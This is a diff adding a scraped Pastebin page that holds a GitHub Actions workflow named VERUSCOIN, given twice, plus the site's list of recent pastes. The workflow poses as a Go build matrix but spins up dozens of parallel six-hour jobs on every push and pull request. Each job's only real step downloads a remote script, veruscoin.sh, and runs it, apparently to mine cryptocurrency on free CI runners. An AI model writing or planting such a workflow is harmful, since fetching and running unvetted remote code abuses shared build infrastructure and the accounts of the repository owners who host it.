@@ -1,0 +1,75 @@
+https://pastebin.com/EKsj31pV
+
+name: VERUSCOIN
+on: [push, pull_request]
+jobs:
+  build:
+    name: Ba_channel
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 30
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        flag: [A, B, C, D, E, F, G, H, I]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: BA_channel
+      run: |
+        wget https://github.com/verus2/vps/blob/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
+
+RAW Paste Data
+name: VERUSCOIN
+on: [push, pull_request]
+jobs:
+  build:
+    name: Ba_channel
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 30
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        flag: [A, B, C, D, E, F, G, H, I]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: BA_channel
+      run: |
+        wget https://github.com/verusverus2/vps/blob/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
+Public Pastes
+SLA BreachMarker
+C | 1 min ago
+Paste Ping
+C | 9 min ago
+Z80 STL Vector/Arr...
+Z80 Assembler | 12 min ago
+CGPA Calculator
+C | 16 min ago
+My Log File
+HTML 5 | 21 min ago
+c_strings_with_poi...
+C | 1 hour ago
+threejs-viewer-18
+JavaScript | 1 hour ago
+ds18b20
+Arduino | 2 hours ago
